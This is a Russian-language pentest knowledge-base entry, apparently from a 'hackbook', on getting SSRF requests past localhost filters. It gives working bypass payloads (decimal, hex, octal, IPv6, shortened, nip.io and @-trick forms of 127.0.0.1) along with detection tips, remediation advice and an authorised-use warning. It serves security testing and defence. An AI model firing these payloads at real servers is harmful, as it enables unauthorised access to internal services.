---
id: ssrf-localhost-obfuscation
title: "SSRF: обход фильтра localhost альтернативными представлениями"
type: ssrf
target: http
category: web
difficulty: intermediate
bypass: filter
tags: [ssrf, bypass, encoding, ip-obfuscation]
tested_on: ["Python requests", "curl", "Java URL"]
success_rate: 0.55
risk: medium
cwe: "CWE-918"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
  - "https://portswigger.net/web-security/ssrf"
graph:
  - target: "ssrf"
    type: instance_of
  - target: "waf-bypass"
    type: technique_of
---

# SSRF: обход фильтра localhost альтернативными представлениями

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
http://2130706433/
```

## Explanation

Фильтры часто сравнивают строку с `localhost`/`127.0.0.1`. Тот же адрес записывается
десятками способов, и разные резолверы/языки принимают их по-разному:

- десятичное: `2130706433` (= 127.0.0.1)
- шестнадцатеричное: `0x7f000001`, `0x7f.0x0.0x0.0x1`
- восьмеричное: `0177.0.0.01`
- IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
- сокращённое: `http://127.1/`
- DNS: `localtest.me`, `127.0.0.1.nip.io`, собственный A-записи домен
- `0.0.0.0` и `@`-трюки: `http://expected.com@127.0.0.1/`

## Detection

Проверьте, что именно фильтруется: строка, IP после резолва или объект URL.
Если фильтр строковый — почти любое представление из списка выше его обходит.
Фиксируйте: запрос к вашему collaborator-хосту приходит или нет.

## Remediation

- Резолвить DNS ДО проверки и проверять все возвращённые IP (включая IPv6).
- Блокировать диапазоны: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16,
  169.254.0.0/16, ::1, fc00::/7, fe80::/10.
- Запрет редиректов или повторная валидация каждого hop'а.
- Исходящий прокси с whitelist (egress-only через squid/HTTP_PROXY).
- DNS-rebinding защита: pinning IP после резолва.

## Variants

```
http://127.1/
```

```
http://[::1]/
```

```
http://0x7f000001/
```

```
http://127.0.0.1.nip.io/
```

```
http://localtest.me:8080/
```
